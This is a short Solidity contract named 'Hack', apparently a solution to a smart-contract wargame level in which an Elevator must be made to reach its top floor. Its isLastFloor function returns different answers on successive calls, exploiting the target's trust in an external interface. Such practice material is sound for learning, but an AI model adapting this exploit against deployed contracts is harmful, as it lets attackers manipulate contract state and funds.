// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Goal - reach top floor

contract Hack {
    Elevator private immutable target;
    uint private count;

    constructor(address _target) {
        target = Elevator(_target);
    }

    function pwn() external {
        target.goTo(1);
        require(target.top(), "not top");
    }

    function isLastFloor(uint) external returns (bool) {
        count++;
        return count > 1;
    }
}
